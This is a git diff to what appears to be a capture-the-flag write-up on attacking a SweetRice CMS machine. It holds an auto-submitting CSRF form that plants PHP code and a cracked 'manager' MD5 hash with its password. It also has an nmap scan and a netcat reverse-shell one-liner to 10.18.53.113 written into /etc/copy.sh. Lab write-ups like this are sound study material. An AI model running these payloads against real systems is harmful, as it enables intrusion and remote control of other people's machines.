@@ -32,6 +32,8 @@ draft: false
 
 - exploited and found backup sql database
 - admin account
+
+````
 user<html>
 <body onload="document.exploit.submit();">
 <form action="http://localhost/sweetrice/as/?type=ad&mode=save" method="POST" name="exploit">
@@ -43,8 +45,9 @@ phpinfo();?>
 &lt;/textarea&gt;
 </form>
 </body>
-</html>name: manager
-    password: 42f749ade7f9e195bf475f37a44cafcb
+</html>```
+- name: manager
+    -password: 42f749ade7f9e195bf475f37a44cafcb
         - hashid: md5
         - password is= Password123
 
@@ -55,7 +58,7 @@ phpinfo();?>
 ```bash
 22
 80
-```
+````
 
 ### Users:Passwords
 
@@ -72,4 +75,4 @@ phpinfo();?>
 
 `sudo nmap -sC -sV -oN scans/initial $IP`
 
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.53.113 4445 >/tmp/f" > /etc/copy.sh
+`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.53.113 4445 >/tmp/f" > /etc/copy.sh`
